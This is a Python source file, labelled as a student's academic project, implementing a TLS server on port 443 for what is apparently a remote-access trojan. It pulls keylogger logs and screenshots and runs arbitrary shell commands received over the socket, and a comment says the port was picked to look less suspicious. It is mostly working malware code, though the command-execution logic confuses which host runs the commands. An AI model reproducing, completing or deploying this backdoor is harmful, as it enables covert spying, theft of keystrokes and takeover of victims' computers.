# DISCLAIMER: Projeto acadêmico - Centro Tecnológico de Viçosa - MG
# Aluno: Joelson Tubsfly (745872-ADS - Noturno)

import socket
import subprocess
import os
import ssl
import threading

HOST = '0.0.0.0'  # Escuta em todas as interfaces
PORT = 443         # Porta padrão para HTTPS (menos suspeita)
CERT = 'server.pem' # Certificado autoassinado

def handle_client(conn):
    try:
        while True:
            cmd = conn.recv(1024).decode()
            if cmd == 'keylogs':
                # Solicita logs do keylogger
                conn.send(b"GET_LOGS")
                logs = conn.recv(4096)
                save_logs(logs)
            elif cmd == 'screenshot':
                conn.send(b"CAPTURE_SCREEN")
                img_data = conn.recv(1048576)  # 1MB
                save_image(img_data)
            elif cmd.lower() == 'exit':
                conn.send(b"Conexao encerrada.")
                break
            else:
                # Executa o comando no sistema alvo
                try:
                    output = subprocess.getoutput(cmd)
                    conn.send(output.encode())
                except Exception as e:
                    conn.send(f"Erro: {e}".encode())
    except:
        conn.close()

def save_logs(logs):
    with open("keylogs.txt", "ab") as f:
        f.write(logs)

def save_image(img_data):
    with open("screenshot.png", "wb") as f:
        f.write(img_data)

def start_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(CERT)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        with context.wrap_socket(s, server_side=True) as ssock:
            while True:
                conn, addr = ssock.accept()
                print(f"Conexão estabelecida com {addr}")
                threading.Thread(target=handle_client, args=(conn,)).start()

if __name__ == "__main__":
    start_server() 